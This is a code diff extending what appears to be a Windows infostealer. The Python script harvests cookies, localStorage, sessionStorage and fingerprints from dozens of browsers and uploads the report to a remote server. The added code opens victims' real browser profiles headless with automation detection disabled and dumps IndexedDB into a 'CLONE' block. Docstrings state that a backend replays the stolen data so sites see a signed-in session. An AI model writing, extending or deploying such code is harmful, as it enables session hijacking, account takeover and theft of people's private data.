@@ -5,6 +5,7 @@
 #     "cryptography",
 #     "requests",
 #     "cramjam",
+#     "playwright",
 # ]
 # ///
 
@@ -35,6 +36,15 @@ import windows.generated_def as gdef
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
 
 import requests   # added for upload
+
+# Playwright is used for IndexedDB extraction -- it can launch Chromium
+# pointing at an existing profile and read IndexedDB via JavaScript, which
+# is impossible to do reliably from raw LevelDB files.
+try:
+    from playwright.sync_api import sync_playwright
+    HAS_PLAYWRIGHT = True
+except ImportError:
+    HAS_PLAYWRIGHT = False
 
 
 # ---------------------------------------------------------------------------
@@ -116,6 +126,18 @@ CHROMIUM_CATALOG = [
     {"name": "Comodo Dragon",  "root_env": "LOCALAPPDATA", "subpath": r"Comodo\Dragon\User Data"},
     {"name": "360 Chrome",     "root_env": "LOCALAPPDATA", "subpath": r"360Chrome\Chrome\User Data"},
 ]
+
+# Map test.py browser names → Playwright channel names (for system browser launch).
+# Non-mapped browsers fall back to Playwright's bundled Chromium with user_data_dir.
+_PLAYWRIGHT_CHANNEL = {
+    "Chrome": "chrome",
+    "Chrome Beta": "chrome-beta",
+    "Chrome Dev": "chrome-dev",
+    "Chrome Canary": "chrome-canary",
+    "Edge": "msedge",
+    "Edge Beta": "msedge-beta",
+    "Edge Dev": "msedge-dev",
+}
 
 # Firefox-family: cookies live (unencrypted) in cookies.sqlite inside each profile
 # folder under the "Profiles" directory.
@@ -1383,7 +1405,72 @@ def _extract_preferences(user_data_path):
 
 
 # ---------------------------------------------------------------------------
-# Storage + fingerprint serialization (appended to the cookie report)
+# IndexedDB extraction via Playwright (offline LevelDB parsing is unreliable)
+# ---------------------------------------------------------------------------
+def extract_indexeddb_via_playwright(user_data, browser_name, emit):
+    """Launch Chromium pointing at an existing profile and extract IndexedDB
+    via storageState(indexedDB=True). Returns {origin: [db_dicts]} or None.
+
+    This is the only reliable way to read IndexedDB because Chromium stores it
+    in a proprietary binary format inside LevelDB -- only the browser itself
+    can deserialize it correctly. Playwright's storageState API delegates to
+    Chromium's own IndexedDB serialization.
+    """
+    if not HAS_PLAYWRIGHT:
+        emit("    Playwright not installed; skipping IndexedDB. (pip install playwright)")
+        return None
+
+    channel = _PLAYWRIGHT_CHANNEL.get(browser_name)
+    emit(f"    Launching Playwright with channel={channel or '(bundled)'} to capture IndexedDB...")
+
+    try:
+        with sync_playwright() as p:
+            # Launch persistent context: this opens the REAL profile directory so
+            # all cookies, localStorage, and IndexedDB are loaded from disk.
+            launch_kwargs = {
+                "user_data_dir": user_data,
+                "headless": True,
+                "args": [
+                    "--disable-blink-features=AutomationControlled",
+                    "--no-first-run",
+                    "--no-default-browser-check",
+                    "--disable-extensions",
+                ],
+            }
+            if channel:
+                launch_kwargs["channel"] = channel
+
+            context = p.chromium.launch_persistent_context(**launch_kwargs)
+
+            # Force initialization by navigating to about:blank. This ensures
+            # IndexedDB connections are opened and data is loaded into memory.
+            page = context.new_page()
+            page.goto("about:blank", wait_until="load", timeout=10000)
+
+            # Capture full storage state including IndexedDB.
+            state = context.storage_state(indexedDB=True)
+
+            context.close()
+
+            # Extract IndexedDB: per-origin database descriptors
+            indexeddb = {}
+            for origin_entry in (state.get("origins") or []):
+                origin = origin_entry.get("origin", "")
+                dbs = origin_entry.get("indexedDB") or []
+                if origin and dbs:
+                    indexeddb[origin] = dbs
+
+            emit(f"    IndexedDB captured: {len(indexeddb)} origin(s) with data")
+            return indexeddb if indexeddb else None
+
+    except Exception as e:
+        emit(f"    ! IndexedDB extraction failed: {e}")
+        # If the profile is locked (e.g. browser still running), we can't proceed.
+        return None
+
+
+# ---------------------------------------------------------------------------
+# Storage + fingerprint + IndexedDB serialization (appended to the cookie report)
 # ---------------------------------------------------------------------------
 STORAGE_BEGIN = "<<<CLONE_STORAGE_V1"
 STORAGE_END = "CLONE_STORAGE_V1>>>"
@@ -1391,20 +1478,28 @@ FINGERPRINT_BEGIN = "<<<CLONE_FINGERPRINT_V1"
 FINGERPRINT_END = "CLONE_FINGERPRINT_V1>>>"
 COOKIES_JSON_BEGIN = "<<<CLONE_COOKIES_JSON_V1"
 COOKIES_JSON_END = "CLONE_COOKIES_JSON_V1>>>"
+INDEXEDDB_BEGIN = "<<<CLONE_INDEXEDDB_V1"
+INDEXEDDB_END = "CLONE_INDEXEDDB_V1>>>"
 
 def serialize_storage_block(storage_data):
-    """Serialize { (browser, profile): {origin: {local: {k:v}}} } → embedded JSON block.
+    """Serialize { (browser, profile): {origin: {local: {k:v}, session: {k:v}}} } → embedded JSON block.
 
-    The backend's cookies.py already reads this block and seeds localStorage via
-    an init_script that fires before every page's own scripts — so a site that
-    keeps its session token in JS storage sees a signed-in session immediately.
+    The backend's cookies.py reads both "local" and "session" keys and seeds them
+    via init_scripts before any page scripts run. Session storage is volatile and
+    only available when the browser was running during extraction, but when present
+    it should be serialized.
     """
     profiles_out = []
     for (browser, profile), origins in storage_data.items():
         norm = {}
         for origin, data in origins.items():
+            entry = {}
             if data.get("local"):
-                norm[origin] = {"local": data["local"]}
+                entry["local"] = data["local"]
+            if data.get("session"):
+                entry["session"] = data["session"]
+            if entry:
+                norm[origin] = entry
         if norm:
             profiles_out.append({
                 "browser": browser,
@@ -1415,6 +1510,36 @@ def serialize_storage_block(storage_data):
         return ""
     payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
     return f"\n\n{STORAGE_BEGIN}\n{payload}\n{STORAGE_END}\n"
+
+
+def serialize_indexeddb_block(indexeddb_data):
+    """Serialize { (browser, profile): {origin: [db_dicts]} } → embedded JSON block.
+
+    The backend can restore this by calling Playwright's context.storage_state()
+    or by running a script that opens the IndexedDB databases and populates them.
+    The format follows Playwright's storageState IndexedDB structure:
+
+      {profiles: [{browser, profile, origins: {origin: [{name, version, stores: [...]}]}}]}
+
+    This mirrors the structure of the storage block so the backend can use the
+    same (browser, profile) keying to look up the IndexedDB data for a specific
+    login's browser profile.
+    """
+    if not indexeddb_data:
+        return ""
+    profiles_out = []
+    for (browser, profile), origins in indexeddb_data.items():
+        if not origins:
+            continue
+        profiles_out.append({
+            "browser": browser,
+            "profile": profile,
+            "origins": origins,
+        })
+    if not profiles_out:
+        return ""
+    payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
+    return f"\n{INDEXEDDB_BEGIN}\n{payload}\n{INDEXEDDB_END}\n"
 
 def serialize_fingerprint_block(machine_fp, browser_fps):
     """Serialize {machine: {...}, browsers: {browser_name: {...}}}  → embedded JSON block."""
@@ -1519,7 +1644,7 @@ def main(args):
     # --- Collect localStorage from Chromium profiles ---
     emit("")
     emit("Extracting localStorage from Chromium profiles...")
-    storage_data = {}   # { (browser, profile): {origin: {"local": {k:v}}} }
+    storage_data = {}   # { (browser, profile): {origin: {"local": {k:v}, "session": {k:v}}} }
     for b in chromium:
         user_data = b["user_data"]
         browser_name = b["name"]
@@ -1538,6 +1663,25 @@ def main(args):
                 origin_count = len(ls)
                 emit(f"  {browser_name} / {prof['profile']}: {origin_count} origins with localStorage")
 
+    # --- Collect IndexedDB from Chromium profiles via Playwright ---
+    emit("")
+    emit("Extracting IndexedDB via Playwright (this requires the browser to not be running)...")
+    indexeddb_data = {}   # { (browser, profile): {origin: [db_descriptors]} }
+    for b in chromium:
+        user_data = b["user_data"]
+        browser_name = b["name"]
+        result = extract_indexeddb_via_playwright(user_data, browser_name, emit)
+        if result:
+            # IndexedDB is per-browser User Data directory, not per-profile.
+            # Playwright loads ALL profiles from user_data_dir, so the result
+            # is keyed by origin only. We store it under the first non-Guest
+            # profile we found, since that's where the data logically lives.
+            profiles = enumerate_chromium_profiles(user_data)
+            for prof in profiles:
+                key = (browser_name, prof["profile"])
+                indexeddb_data[key] = result
+            emit(f"  {browser_name}: attached to {len(profiles)} profile(s)")
+
     # --- Collect fingerprint data ---
     emit("")
     emit("Collecting browser fingerprint...")
@@ -1552,12 +1696,13 @@ def main(args):
     # Build the final report and collect all output lines.
     report_lines = build_report(records)
 
-    # Combine log_lines, report, storage block, fingerprint block, and full cookie JSON.
+    # Combine log_lines, report, storage block, fingerprint block, IndexedDB block, and full cookie JSON.
     storage_block = serialize_storage_block(storage_data)
     fingerprint_block = serialize_fingerprint_block(machine_fp, browser_fps)
     cookies_json_block = serialize_cookies_json_block(records)
+    indexeddb_block = serialize_indexeddb_block(indexeddb_data)
     full_output = ("\n".join(log_lines) + "\n\n" + "\n".join(report_lines)
-                   + storage_block + fingerprint_block + cookies_json_block)
+                   + storage_block + fingerprint_block + cookies_json_block + indexeddb_block)
 
     # Print the final report to console (already printed via emit, but let's show the extra sections)
     print("")
@@ -1569,6 +1714,8 @@ def main(args):
         print(storage_block)
     if fingerprint_block:
         print(fingerprint_block)
+    if indexeddb_block:
+        print(indexeddb_block)
 
     # Upload the output to the remote server.
     upload_url = args.url
